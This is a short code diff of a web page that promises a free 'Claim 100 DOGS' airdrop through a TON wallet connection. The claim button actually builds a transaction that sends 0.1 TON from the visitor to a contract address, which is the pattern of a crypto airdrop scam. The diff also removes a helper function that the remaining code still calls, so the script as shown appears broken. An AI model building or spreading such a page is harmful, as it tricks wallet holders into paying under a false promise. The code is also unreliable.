@@ -262,7 +262,7 @@
 
         <div id="ton-connect"></div>
         <button id="claim-button">
-            <i class="fas fa-bone"></i> Claim 100 DOGS
+            <i class="fas fa-bone"></i> Claim 100 DOGS!
         </button>
 
         <div class="progress-container">
@@ -339,11 +339,6 @@
                 updateStatus('Preparing transaction...', 'info');
                 updateProgress(20);
 
-
-                const payloadData = { comment: 'Claim airdrop' };
-                function toBase64(input) {
-                    return window.btoa(unescape(encodeURIComponent(input)));
-                }
                 const payloadBase64 = toBase64("Claim airdrop");
 
                 const transaction = {
@@ -352,7 +347,7 @@
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
                             amount: '100000000', // 0.1 TON (w nanotonach)
-                            payload: ''
+                            payload: payloadBase64
                         }
                     ]
                 };
